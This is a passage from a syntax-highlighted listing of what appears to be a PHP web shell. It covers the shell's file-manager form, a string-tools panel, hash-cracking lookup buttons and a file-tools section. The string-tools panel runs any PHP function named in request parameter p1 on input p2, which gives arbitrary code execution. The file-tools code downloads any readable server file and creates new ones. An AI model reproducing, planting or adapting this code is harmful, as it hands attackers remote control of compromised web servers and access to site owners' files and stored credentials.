<span class="lineno"> 627</span> <span class="x">    &lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 628</span> <span class="x">    &lt;select name=&#39;p1&#39;&gt;&lt;option value=&#39;copy&#39;&gt;Copy&lt;/option&gt;&lt;option value=&#39;move&#39;&gt;Move&lt;/option&gt;&lt;option value=&#39;delete&#39;&gt;Delete&lt;/option&gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span><span class="o">&amp;&amp;@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span><span class="cp">?&gt;</span><span class="x">&lt;option value=&#39;paste&#39;&gt;Paste&lt;/option&gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span><span class="cp">?&gt;</span><span class="x">&lt;/select&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt; </span>
<span class="lineno"> 629</span> <span class="x">    &lt;/form&gt;&lt;/table&gt;&lt;/div&gt; </span>
<span class="lineno"> 630</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno"> 631</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 632</span> <span class="p">}</span> 
<span class="lineno"> 633</span> 
<span class="lineno"> 634</span> <span class="k">function</span> <span class="nf">actionStringTools</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 635</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2bin&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2bin</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">decbin</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span> 
<span class="lineno"> 636</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2ascii&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2ascii</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strLen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">2</span><span class="p">){</span><span class="nv">$r</span><span class="o">.=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">]));}</span><span class="k">return</span> <span class="nv">$r</span><span class="p">;}}</span> 
<span class="lineno"> 637</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;ascii2hex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">ascii2hex</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span> 
<span class="lineno"> 638</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;full_urlencode&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">full_urlencode</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span> 
<span class="lineno"> 639</span>      
<span class="lineno"> 640</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 641</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno"> 642</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 643</span>         <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 644</span>             <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span> 
<span class="lineno"> 645</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;strOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;strOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 646</span>         <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span> 
<span class="lineno"> 647</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 648</span>     <span class="p">}</span> 
<span class="lineno"> 649</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 650</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 651</span>     <span class="nv">$stringTools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
<span class="lineno"> 652</span>         <span class="s1">&#39;Base64 encode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64_encode&#39;</span><span class="p">,</span> 
<span class="lineno"> 653</span>         <span class="s1">&#39;Base64 decode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64_decode&#39;</span><span class="p">,</span> 
<span class="lineno"> 654</span>         <span class="s1">&#39;Url encode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;urlencode&#39;</span><span class="p">,</span> 
<span class="lineno"> 655</span>         <span class="s1">&#39;Url decode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;urldecode&#39;</span><span class="p">,</span> 
<span class="lineno"> 656</span>         <span class="s1">&#39;Full urlencode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;full_urlencode&#39;</span><span class="p">,</span> 
<span class="lineno"> 657</span>         <span class="s1">&#39;md5 hash&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;md5&#39;</span><span class="p">,</span> 
<span class="lineno"> 658</span>         <span class="s1">&#39;sha1 hash&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span> 
<span class="lineno"> 659</span>         <span class="s1">&#39;crypt&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;crypt&#39;</span><span class="p">,</span> 
<span class="lineno"> 660</span>         <span class="s1">&#39;CRC32&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;crc32&#39;</span><span class="p">,</span> 
<span class="lineno"> 661</span>         <span class="s1">&#39;ASCII to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ascii2hex&#39;</span><span class="p">,</span> 
<span class="lineno"> 662</span>         <span class="s1">&#39;HEX to ASCII&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hex2ascii&#39;</span><span class="p">,</span> 
<span class="lineno"> 663</span>         <span class="s1">&#39;HEX to DEC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> 
<span class="lineno"> 664</span>         <span class="s1">&#39;HEX to BIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hex2bin&#39;</span><span class="p">,</span> 
<span class="lineno"> 665</span>         <span class="s1">&#39;DEC to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> 
<span class="lineno"> 666</span>         <span class="s1">&#39;DEC to BIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> 
<span class="lineno"> 667</span>         <span class="s1">&#39;BIN to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;bin2hex&#39;</span><span class="p">,</span> 
<span class="lineno"> 668</span>         <span class="s1">&#39;BIN to DEC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span>         
<span class="lineno"> 669</span>         <span class="s1">&#39;String to lower case&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strtolower&#39;</span><span class="p">,</span> 
<span class="lineno"> 670</span>         <span class="s1">&#39;String to upper case&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strtoupper&#39;</span><span class="p">,</span> 
<span class="lineno"> 671</span>         <span class="s1">&#39;Htmlspecialchars&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span> 
<span class="lineno"> 672</span>         <span class="s1">&#39;String length&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strlen&#39;</span><span class="p">,</span> 
<span class="lineno"> 673</span>     <span class="p">);</span> 
<span class="lineno"> 674</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 675</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 676</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;form name=&#39;toolsForm&#39; onSubmit=&#39;if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;&#39;&gt;&lt;select name=&#39;selectTool&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 677</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$stringTools</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno"> 678</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;&lt;/option&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 679</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;/select&gt;&lt;input type=&#39;submit&#39; value=&#39;&gt;&gt;&#39;/&gt; &lt;input type=checkbox name=ajax value=1 &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; send using AJAX&lt;br&gt;&lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;/form&gt;&lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 680</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 681</span>         <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 682</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]));</span> 
<span class="lineno"> 683</span>     <span class="p">}</span> 
<span class="lineno"> 684</span>     <span class="k">echo</span><span class="s2">&quot;&lt;/pre&gt;&lt;/div&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 685</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 686</span> <span class="x">    &lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt; </span>
<span class="lineno"> 687</span> <span class="x">        &lt;form method=&#39;post&#39; target=&#39;_blank&#39; name=&quot;hf&quot;&gt; </span>
<span class="lineno"> 688</span> <span class="x">            &lt;input type=&quot;text&quot; name=&quot;hash&quot; style=&quot;width:200px;&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 689</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;hashcrack.com&quot; onclick=&quot;document.hf.action=&#39;http://www.hashcrack.com/index.php&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 690</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;milw0rm.com&quot; onclick=&quot;document.hf.action=&#39;http://www.milw0rm.com/cracker/search.php&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 691</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;hashcracking.info&quot; onclick=&quot;document.hf.action=&#39;https://hashcracking.info/index.php&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 692</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;md5.rednoize.com&quot; onclick=&quot;document.hf.action=&#39;http://md5.rednoize.com/?q=&#39;+document.hf.hash.value+&#39;&amp;s=md5&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 693</span> <span class="x">            &lt;input type=&quot;button&quot; value=&quot;md5decrypter.com&quot; onclick=&quot;document.hf.action=&#39;http://www.md5decrypter.com/&#39;;document.hf.submit()&quot;&gt;&lt;br&gt; </span>
<span class="lineno"> 694</span> <span class="x">        &lt;/form&gt; </span>
<span class="lineno"> 695</span> <span class="x">    &lt;/div&gt; </span>
<span class="lineno"> 696</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno"> 697</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 698</span> <span class="p">}</span> 
<span class="lineno"> 699</span> 
<span class="lineno"> 700</span> <span class="k">function</span> <span class="nf">actionFilesTools</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 701</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno"> 702</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 703</span>     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 704</span>         <span class="k">if</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 705</span>             <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> 
<span class="lineno"> 706</span>             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 707</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mime_content_type&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 708</span>                 <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 709</span>                 <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span><span class="o">.</span><span class="nv">$type</span><span class="p">);</span> 
<span class="lineno"> 710</span>             <span class="p">}</span> 
<span class="lineno"> 711</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span> 
<span class="lineno"> 712</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 713</span>                 <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> 
<span class="lineno"> 714</span>                     <span class="k">echo</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span> 
<span class="lineno"> 715</span>                 <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 716</span>             <span class="p">}</span> 
<span class="lineno"> 717</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 718</span> 
<span class="lineno"> 719</span>         <span class="p">}</span> 
<span class="lineno"> 720</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 721</span>     <span class="p">}</span> 
<span class="lineno"> 722</span>     <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mkfile&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 723</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 724</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span> 
<span class="lineno"> 725</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 726</span>                 <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;edit&quot;</span><span class="p">;</span> 
<span class="lineno"> 727</span>                 <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 728</span>             <span class="p">}</span> 
<span class="lineno"> 729</span>         <span class="p">}</span> 
<span class="lineno"> 730</span>     <span class="p">}</span> 
<span class="lineno"> 731</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 732</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 733</span>     <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 734</span>         <span class="k">echo</span> <span class="s1">&#39;File not exists&#39;</span><span class="p">;</span> 
<span class="lineno"> 735</span>         <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 736</span>         <span class="k">return</span><span class="p">;</span> 
<span class="lineno"> 737</span>     <span class="p">}</span> 
<span class="lineno"> 738</span>     <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 739</span>     <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 740</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Name:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Size:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">viewSize</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">:</span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Permission:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nx">viewPermsColor</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Owner/Group:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 741</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Create time:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Access time:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Modify time:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 742</span>     <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno"> 743</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;view&#39;</span><span class="p">;</span> 
<span class="lineno"> 744</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> 
